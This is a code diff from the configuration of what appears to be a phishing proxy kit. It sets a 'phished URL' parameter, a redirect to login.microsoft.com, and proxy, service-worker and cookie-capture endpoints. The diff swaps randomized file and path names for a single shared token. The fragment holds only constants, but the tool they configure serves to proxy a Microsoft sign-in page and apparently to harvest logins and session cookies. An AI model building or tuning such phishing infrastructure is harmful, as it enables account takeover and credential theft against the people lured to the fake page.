@@ -12,16 +12,16 @@ const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://login.microsoft.com";
 
 const PROXY_FILES = {
-    index: "index_smQGUDpTF7PN.html",
-    notFound: "404_not_found_lk48ZVr32WvU.html",
-    script: "script_Vx9Z6XN5uC3k.js"
+    index: "index_mp7hkI72.html",
+    notFound: "404_not_found_mp7hkI72.html",
+    script: "script_mp7hkI72.js"
 };
 const PROXY_PATHNAMES = {
-    proxy: "/lNv1pC9AWPUY4gbidyBO",
-    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
+    proxy: "/mp7hkI72",
+    serviceWorker: "/service_worker_mp7hkI72.js",
     script: "/@",
-    mutation: "/Mutation_o5y3f4O7jMGW",
-    jsCookie: "/JSCookie_6X7dRqLg90mH",
+    mutation: "/Mutation_mp7hkI72",
+    jsCookie: "/JSCookie_mp7hkI72",
     favicon: "/favicon.ico"
 };
 
